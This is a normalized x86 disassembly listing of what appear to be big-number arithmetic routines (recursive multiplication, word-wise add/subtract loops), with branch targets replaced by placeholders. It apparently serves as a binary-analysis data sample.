mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x5c ]
push eax
push ecx
push eax
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
push ebx
mov [ esp + 0x40 ] eax
mov ecx [ esi + 0x4 ]
mov [ esp + 0x44 ] ecx
mov edx [ esi + 0x8 ]
mov [ esp + 0x48 ] edx
mov eax [ esi + 0xc ]
mov edx [ esp + 0x50 ]
mov [ esp + 0x4c ] eax
mov ecx [ esi + 0x10 ]
and edx 0x1
and ecx 0xfffffffe
lea eax [ esp + 0x40 ]
or ecx edx
mov edx [ esp + 0x24 ]
or ecx 0x6
push edi
mov [ esp + 0x54 ] ecx
mov ecx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
mov [ esp + 0x58 ] 0xffffffff
mov ecx [ eax + 0x4 ]
test ecx ecx
jle r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
push ebx
mov ebp esi
push eax
push ecx
mov esi edi
mov edi [ esp + 0x20 ]
push ebp
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
test [ ecx ] 0x1
je r-xdata
push 0x285
push r--data
push 0x6c
push 0x8b
push 0x3
call sub_1001de60
add esp 0x14
mov edx [ esi ]
cmp [ edx ] 0x1
jne r-xdata
mov edx [ esp + 0x60 ]
push edx
push ebp
push ebp
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x5c ]
push eax
push edx
push eax
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_10029870
mov edx [ esp + 0x14 ]
mov edi eax
push edx
call sub_10029870
add esp 0x8
cmp eax edi
jne r-xdata
push eax
call sub_10029870
add esp 0x4
cmp eax 0x800
jg r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x60 ]
mov edx [ esp + 0x58 ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x60 ] ecx
neg edx
test eax eax
mov [ esp + 0x18 ] ebp
mov [ esp + 0x58 ] edx
jne r-xdata
mov eax [ esp + 0x10 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
push esi
call sub_10029870
mov ecx [ esp + 0x14 ]
mov edi eax
push ecx
inc edi
call sub_10029870
add esp 0x8
cmp eax edi
jne r-xdata
push 0x1
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x60 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
mov eax edx
test eax eax
jge r-xdata
push 0x1eb
push r--data
push 0x6c
push 0x6e
push 0x3
call sub_1001de60
add esp 0x14
mov ecx [ eax ]
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x10 ]
push eax
push esi
push ecx
push ebx
push ebp
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x24 ]
push esi
push edi
call sub_10035d30
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push eax
push ebx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
mov ebp [ esp + 0x14 ]
mov esi [ esp + 0x60 ]
mov ecx [ esp + 0x5c ]
mov esi eax
push ecx
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edi [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
cmp eax 0x1
mov esi ebx
jne r-xdata
mov edx [ esp + 0x10 ]
push edi
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
jmp r-xdata
mov ecx [ esp + 0x10 ]
xor ebx ebx
push ebx
push ecx
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
inc ebx
test eax eax
jle r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x10 ] edx
jmp r-xdata
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x1c ]
push ebx
push eax
push esi
push ecx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
push esi
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push ebp
push edi
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov edx [ ebp ]
cmp [ edx ] eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push edi
push ecx
push ebx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
push 0x1
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
push ebx
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
mov eax [ ebp + 0x4 ]
inc ebx
test eax eax
jle r-xdata
push edi
push edi
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
test [ edx ] 0x1
je r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x10 ] edx
jmp r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x5c ]
mov esi edx
push eax
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
push edi
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push esi
push edi
push ebp
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push eax
push edi
push ebp
push ebp
call sub_10038720
add esp 0xc
test eax eax
je r-xdata
push ebp
push edi
push edi
call sub_10038720
add esp 0xc
test eax eax
je r-xdata
push ebp
push ebp
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp ]
test [ edx ] 0x1
je r-xdata
push ebx
push esi
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
push eax
push edi
push edi
call sub_10038720
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
jmp r-xdata
mov edx [ esp + 0x60 ]
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x1c ]
push edx
push eax
push esi
push ecx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push esi
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x58 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x18 ] edi
neg ecx
test eax eax
mov [ esp + 0x58 ] ecx
jne r-xdata
mov edx [ ebp ]
cmp [ edx ] 0x2
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push edi
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push ebp
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
jmp r-xdata
push esi
push ebx
push ebx
call sub_100387f0
add esp 0xc
test eax eax
je r-xdata
push ebx
push esi
push esi
call sub_100387f0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ebx
push ecx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
push eax
push ebp
push ebp
call sub_10038720
add esp 0xc
test eax eax
je r-xdata
test ebx ebx
jle r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax ecx
test eax eax
jge r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
jmp r-xdata
push 0x3
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
push 0x2
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
jmp r-xdata
test ebx ebx
jle r-xdata
push ebx
push esi
push esi
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp ]
cmp [ ecx ] 0x4
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
push edi
call sub_10035d30
add esp 0x8
test eax eax
je r-xdata
push esi
push ebx
jmp r-xdata
jmp r-xdata
xor ebx ebx
push ebx
push esi
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
push ebx
push eax
push eax
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
jmp r-xdata
push ebx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push eax
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push 0x2
push edx
push edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp ]
mov edx [ ecx ]
push edx
push edi
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
sub_10037880
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
push ebp
push ebx
push edi
push esi
call sub_100537d0
mov ecx [ esp + 0x34 ]
add esp 0x10
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
lea edx [ ebp * 4 ]
add esi edx
add edi edx
add ebx edx
test ecx ecx
jge r-xdata
test eax eax
je r-xdata
mov edx [ ebx ]
lea edi [ edx + eax ]
neg edi
test edx edx
mov [ esi ] edi
je r-xdata
test ecx ecx
jle r-xdata
mov edx [ edi ]
mov ebx edx
sub ebx eax
test edx edx
mov [ esi ] ebx
je r-xdata
inc ecx
jns r-xdata
mov eax 0x1
mov edx [ edi ]
dec ecx
test ecx ecx
mov [ esi ] edx
jle r-xdata
dec ecx
test ecx ecx
jle r-xdata
xor eax eax
mov edx [ ebx + 0x4 ]
lea edi [ edx + eax ]
neg edi
test edx edx
mov [ esi + 0x4 ] edi
je r-xdata
mov edx [ edi + 0x4 ]
dec ecx
test ecx ecx
mov [ esi + 0x4 ] edx
jle r-xdata
mov edx [ edi + 0x4 ]
mov ebx edx
sub ebx eax
test edx edx
mov [ esi + 0x4 ] ebx
je r-xdata
inc ecx
jns r-xdata
mov eax 0x1
mov edx [ edi + 0x8 ]
dec ecx
test ecx ecx
mov [ esi + 0x8 ] edx
jle r-xdata
dec ecx
test ecx ecx
jle r-xdata
xor eax eax
mov edx [ ebx + 0x8 ]
lea edi [ edx + eax ]
neg edi
test edx edx
mov [ esi + 0x8 ] edi
je r-xdata
mov edx [ edi + 0xc ]
dec ecx
test ecx ecx
mov [ esi + 0xc ] edx
jle r-xdata
mov edx [ edi + 0x8 ]
mov ebx edx
sub ebx eax
test edx edx
mov [ esi + 0x8 ] ebx
je r-xdata
inc ecx
jns r-xdata
mov eax 0x1
mov edx [ edi + 0x10 ]
add edi 0x10
add esi 0x10
dec ecx
test ecx ecx
mov [ esi ] edx
jg r-xdata
dec ecx
test ecx ecx
jle r-xdata
xor eax eax
mov edx [ ebx + 0xc ]
lea edi [ edx + eax ]
neg edi
test edx edx
mov [ esi + 0xc ] edi
je r-xdata
mov edx [ edi + 0xc ]
mov ebx edx
sub ebx eax
test edx edx
mov [ esi + 0xc ] ebx
je r-xdata
inc ecx
jns r-xdata
mov eax 0x1
dec ecx
test ecx ecx
jle r-xdata
xor eax eax
add ebx 0x10
add esi 0x10
jmp r-xdata
add edi 0x10
add esi 0x10
test eax eax
jne r-xdata
sub_100379e0
mov eax 0x18
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x2c ]
mov eax ebx
mov ecx [ esp + 0x34 ]
cdq
push ebp
sub eax edx
push esi
mov esi eax
mov eax [ esp + 0x38 ]
push edi
sar esi 0x1
cmp ebx 0x8
lea edi [ esi + eax ]
lea ebp [ esi + ecx ]
jne r-xdata
cmp ebx 0x10
jge r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
mov eax esi
sub eax edi
lea edx [ ecx + esi * 4 ]
push eax
push edi
push edx
push ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] edx
call sub_1002a210
mov ecx [ esp + 0x44 ]
mov ebx eax
xor eax eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x20 ] eax
mov eax ebp
lea edx [ ecx + esi * 4 ]
sub eax esi
mov [ esp + 0x24 ] edx
push eax
push ebp
push ecx
push edx
mov [ esp + 0x44 ] eax
call sub_1002a210
lea ecx [ ebx + ebx * 2 ]
mov ebx [ esp + 0x64 ]
add esp 0x20
lea eax [ eax + ecx + 0x4 ]
cmp eax 0x8
ja r-xdata
mov edx [ esp + 0x34 ]
mov edi [ esp + 0x2c ]
add ecx ebx
add eax ebx
push ecx
mov ecx [ esp + 0x34 ]
push edx
push eax
push ecx
push edi
call sub_10038560
mov edx [ esp + 0x50 ]
mov esi [ esp + 0x54 ]
add esp 0x14
lea ecx [ edx + esi ]
test ecx ecx
jge r-xdata
test ecx ecx
jne r-xdata
cmp esi 0x4
jne r-xdata
jmp [ eax * 4 + jump_table_10037e3c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
lea edx [ edx + ebx * 2 ]
xor eax eax
neg ecx
add edx esi
shl ecx 0x2
lea edi [ edi + edx * 4 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
push eax
push ecx
push edx
call sub_10053890
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
cmp esi 0x8
jne r-xdata
mov eax [ esp + 0x3c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
mov edx edi
sub edx esi
push edx
push edi
push eax
push ecx
push ebx
call sub_10037880
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x48 ]
mov edx esi
sub edx ebp
push edx
push ebp
push eax
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x18 ]
mov eax edi
sub eax esi
push eax
push edi
push ecx
push edx
push ebx
call sub_10037880
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x28 ]
push eax
push ebp
push ecx
lea eax [ ebx + esi * 4 ]
push edx
push eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x30 ]
push ecx
push edi
push edx
push eax
push ebx
call sub_10037880
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x48 ]
mov ecx esi
sub ecx ebp
push ecx
push ebp
push edx
lea ecx [ ebx + esi * 4 ]
push eax
push ecx
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x30 ]
push edx
push edi
push eax
push ecx
push ebx
call sub_10037880
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x28 ]
push edx
push ebp
push eax
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x10 ]
test ecx ecx
lea edi [ ebx + eax * 8 ]
mov [ esp + 0x24 ] edi
jne r-xdata
mov eax [ esp + 0x3c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x40 ]
test eax eax
jne r-xdata
lea edx [ ebx + esi * 4 ]
push ecx
push edx
call sub_10037880
add esp 0x28
call sub_10037880
add esp 0x28
mov [ esp + 0x1c ] 0x1
jmp r-xdata
lea ecx [ eax * 4 ]
xor eax eax
mov [ esp + 0x44 ] ecx
lea ebp [ ecx + ebx ]
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x24 ]
push edi
lea ebp [ eax * 4 ]
push 0x0
push 0x0
lea eax [ ebx + esi * 4 ]
mov [ esp + 0x50 ] ebp
push esi
add ebp ebx
push eax
push ebx
push ebp
call sub_100379e0
add esp 0x1c
jmp r-xdata
mov eax [ esp + 0x40 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x38 ]
push edx
push ebx
push ebp
push ebp
call sub_100536c0
mov ecx [ esp + 0x44 ]
add esp 0x10
add ecx eax
mov [ esp + 0x34 ] ecx
mov ebx ecx
mov ecx [ esp + 0x38 ]
push ecx
push ebp
push ebx
push ebp
call sub_100537d0
mov ebx [ esp + 0x44 ]
add esp 0x10
sub ebx eax
jmp r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
push edi
mov edi [ esp + 0x30 ]
push 0x0
push 0x0
push esi
push eax
push ecx
push edi
call sub_100379e0
mov edx [ esp + 0x60 ]
mov ecx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x5c ]
lea eax [ edx + edi ]
mov edx [ esp + 0x60 ]
push edx
mov edx [ esp + 0x38 ]
push ecx
mov ecx [ esp + 0x40 ]
push esi
push edx
push ecx
push eax
mov [ esp + 0x64 ] eax
call sub_100379e0
add esp 0x38
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x38 ]
mov ecx 0x8
lea ebp [ edx * 4 ]
mov [ esp + 0x44 ] ebp
add ebp ebx
xor eax eax
mov edi ebp
[ edi ]
mov eax [ esp + 0x38 ]
lea ecx [ ebx + 0x10 ]
push ecx
push ebx
lea ebp [ eax * 4 ]
mov [ esp + 0x4c ] ebp
add ebp ebx
push ebp
call sub_10053e40
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x38 ]
add esi edx
mov eax [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
add eax ebx
cmp eax ebx
mov [ edi ] eax
jae r-xdata
mov ecx [ esp + 0x38 ]
lea eax [ edi + esi * 4 ]
push ecx
push ebp
push eax
push eax
call sub_100536c0
add esp 0x10
add ebx eax
je r-xdata
mov edx [ esp + 0x38 ]
mov ecx 0x10
lea ebp [ edx * 4 ]
mov [ esp + 0x44 ] ebp
add ebp ebx
xor eax eax
mov edi ebp
[ edi ]
mov eax [ esp + 0x38 ]
lea ecx [ ebx + 0x20 ]
push ecx
push ebx
lea ebp [ eax * 4 ]
mov [ esp + 0x4c ] ebp
add ebp ebx
push ebp
call sub_10053890
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x2c ]
push edx
push eax
push edi
push ebx
call sub_100536c0
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x2c ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
mov edi [ esp + 0x2c ]
push eax
push ecx
push edi
call sub_10053e40
mov edx [ esp + 0x50 ]
mov ecx [ esp + 0x40 ]
add ecx 0x10
lea eax [ edx + edi ]
mov edx [ esp + 0x3c ]
add edx 0x10
push ecx
push edx
push eax
mov [ esp + 0x44 ] eax
call sub_10053e40
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
inc eax
mov [ edi ] eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
mov edi [ esp + 0x2c ]
push eax
push ecx
push edi
call sub_10053890
mov edx [ esp + 0x50 ]
mov ecx [ esp + 0x40 ]
add ecx 0x20
lea eax [ edx + edi ]
mov edx [ esp + 0x3c ]
add edx 0x20
push ecx
push edx
push eax
mov [ esp + 0x44 ] eax
call sub_10053890
add esp 0x18
jmp r-xdata
sub_10037e60
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
cmp ebp 0x8
push edi
jge r-xdata
mov esi [ esp + 0x2c ]
mov edi [ esp + 0x20 ]
mov eax ebp
sub eax esi
lea ecx [ edi + ebp * 4 ]
push eax
push esi
push ecx
push edi
mov [ esp + 0x38 ] eax
mov [ esp + 0x30 ] ecx
call sub_1002a210
mov ebx [ esp + 0x40 ]
mov ecx [ esp + 0x34 ]
mov [ esp + 0x20 ] eax
mov eax ebx
sub eax ebp
lea edx [ ecx + ebp * 4 ]
push eax
push ebx
push ecx
push edx
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x50 ] eax
mov [ esp + 0x4c ] edx
call sub_1002a210
mov ecx [ esp + 0x30 ]
add esp 0x20
lea ecx [ ecx + ecx * 2 ]
lea eax [ eax + ecx + 0x4 ]
cmp eax 0x8
ja r-xdata
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x24 ]
lea ecx [ eax + ebp ]
mov eax [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x24 ]
add ebp eax
push edx
mov edx [ esp + 0x24 ]
push ebp
push ecx
push edx
call sub_10038560
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x34 ]
cmp ebp 0x8
lea ecx [ ebp + ebp ]
jne r-xdata
jmp [ eax * 4 + jump_table_10038284 ]
lea edx [ eax + ecx * 8 ]
push edx
mov [ esp + 0x2c ] edx
shl ecx 0x2
push 0x0
push 0x0
lea edx [ eax + ebp * 4 ]
mov [ esp + 0x3c ] ecx
push ebp
add ecx eax
push edx
push eax
push ecx
mov [ esp + 0x2c ] ecx
call sub_100379e0
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x38 ]
push eax
push 0x0
push 0x0
push ebp
push ecx
push edi
push edx
call sub_100379e0
mov eax ebp
add esp 0x38
cdq
sub eax edx
mov edi eax
mov eax esi
sar edi 0x1
cmp esi ebx
mov [ esp + 0x24 ] edi
jg r-xdata
lea edx [ eax + 0x20 ]
lea ecx [ eax + ecx * 4 ]
push edx
push eax
push ecx
mov [ esp + 0x1c ] ecx
call sub_10053890
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x28 ]
push eax
push edi
push ecx
call sub_10053890
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x34 ]
lea eax [ ebp + ebp ]
add ecx 0x20
push ebx
push ecx
add edi 0x20
lea eax [ edx + eax * 4 ]
push esi
push edi
push eax
mov [ esp + 0x5c ] eax
call sub_10038560
add esp 0x2c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x34 ]
mov edx esi
sub edx ebp
push edx
push esi
push edi
push eax
push ecx
call sub_10037880
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x38 ]
mov edx ebp
sub edx ebx
push edx
push ebx
push eax
jmp r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x34 ]
mov ecx esi
sub ecx ebp
push ecx
push esi
push edi
push edx
push eax
call sub_10037880
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x4c ]
push ebx
push edx
push eax
lea edx [ ecx + ebp * 4 ]
push edx
jmp r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x34 ]
push eax
push esi
push ecx
push edi
push edx
call sub_10037880
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x38 ]
mov eax ebp
sub eax ebx
push eax
mov eax [ esp + 0x4c ]
push ebx
push ecx
lea ecx [ eax + ebp * 4 ]
push edx
push ecx
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x34 ]
push edx
push esi
push eax
push edi
push ecx
call sub_10037880
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x40 ]
push edx
push ebx
push eax
sub eax edi
test eax eax
jne r-xdata
mov eax ebx
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x34 ]
lea edi [ ebp + ebp ]
push edi
push eax
push ecx
push ebx
call sub_100536c0
mov esi eax
mov eax [ esp + 0x24 ]
add esp 0x10
test eax eax
push edi
je r-xdata
mov edx [ esp + 0x54 ]
push ecx
lea eax [ edx + ebp * 4 ]
push eax
call sub_10037880
add esp 0x28
call sub_10037880
add esp 0x28
mov [ esp + 0x14 ] 0x1
jmp r-xdata
jle r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x1c ]
sub ebx edi
push edx
mov edx [ esp + 0x24 ]
sub esi edi
add eax ecx
mov ecx [ esp + 0x30 ]
push ebx
push esi
push edi
push ecx
push edx
push eax
mov [ esp + 0x4c ] eax
call sub_100379e0
lea edx [ ebp + ebp ]
add edi edi
mov ecx edx
xor eax eax
sub ecx edi
add edi edx
mov edx [ esp + 0x38 ]
add esp 0x1c
shl ecx 0x2
lea edi [ edx + edi * 4 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
mov eax [ esp + 0x14 ]
push ebx
push eax
push eax
call sub_100536c0
add esp 0x10
add esi eax
mov eax [ esp + 0x14 ]
push eax
push ebx
push eax
call sub_100537d0
add esp 0x10
sub esi eax
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x1c ]
lea edi [ ecx + eax ]
mov edx ecx
xor eax eax
mov [ esp + 0x30 ] edi
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
cmp esi 0x10
[ edi ]
jge r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x28 ]
add eax ecx
push edx
mov ecx ebx
mov edx esi
sub ecx edi
sub edx edi
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x2c ]
push edi
push ecx
push edx
push eax
mov [ esp + 0x4c ] eax
call sub_10037e60
add esp 0x1c
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
add edi ebp
mov ecx [ ebx + edi * 4 ]
lea eax [ ebx + edi * 4 ]
add ecx esi
cmp ecx esi
mov [ eax ] ecx
jae r-xdata
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
push edi
push edx
lea eax [ ebx + ebp * 4 ]
push eax
push eax
call sub_100536c0
add esp 0x10
add esi eax
je r-xdata
mov eax [ esp + 0x24 ]
cdq
sub eax edx
sar eax 0x1
cmp eax esi
jl r-xdata
cmp ebx 0x10
jge r-xdata
lea edx [ ebp + ebp ]
xor eax eax
mov ecx edx
add edx esi
sub ecx esi
mov esi [ esp + 0x1c ]
sub ecx ebx
add edx ebx
shl ecx 0x2
lea edi [ esi + edx * 4 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
mov ecx [ eax + 0x4 ]
add eax 0x4
inc ecx
mov [ eax ] ecx
je r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
sub ebx eax
push edx
mov edx [ esp + 0x34 ]
sub esi eax
push ebx
push esi
push eax
mov eax [ esp + 0x3c ]
push eax
push ecx
push edx
call sub_10037e60
cmp eax ebx
jl r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x30 ]
push ebx
push eax
push esi
push ecx
push edx
call sub_10038560
add esp 0x14
jmp r-xdata
cmp eax esi
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x2c ]
sub ebx eax
push ecx
mov ecx [ esp + 0x34 ]
sub esi eax
push ebx
push esi
push eax
mov eax [ esp + 0x30 ]
push edx
push eax
push ecx
call sub_100379e0
jmp r-xdata
cmp eax ebx
je r-xdata
add esp 0x1c
cdq
sub eax edx
sar eax 0x1
cmp eax esi
jge r-xdata
sub_100382b0
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x18 ]
push ebx
push ebp
push edi
mov edi [ esp + 0x20 ]
mov ebp [ ecx + 0x4 ]
xor eax eax
mov ebx [ edi + 0x4 ]
mov [ esp + 0x14 ] eax
cmp ebx eax
mov [ esp + 0xc ] eax
je r-xdata
mov ecx [ esp + 0x1c ]
push eax
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop ebp
pop ebx
add esp 0xc
retn
cmp ebp eax
je r-xdata
push esi
mov esi [ esp + 0x2c ]
lea edx [ ebx + ebp ]
push esi
mov [ esp + 0x18 ] edx
call sub_1002dd20
mov eax [ esp + 0x24 ]
add esp 0x4
cmp eax edi
je r-xdata
push esi
call sub_1002de70
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp eax [ esp + 0x28 ]
je r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_1002de00
mov eax [ esp + 0x1c ]
add esp 0x4
pop esi
pop edi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ esp + 0x28 ]
mov eax [ edi + 0xc ]
mov edi ebx
mov edx [ ecx + 0xc ]
xor eax edx
sub edi ebp
mov [ esi + 0xc ] eax
jne r-xdata
mov esi eax
jmp r-xdata
cmp ebx 0x10
jl r-xdata
cmp ebx 0x8
jne r-xdata
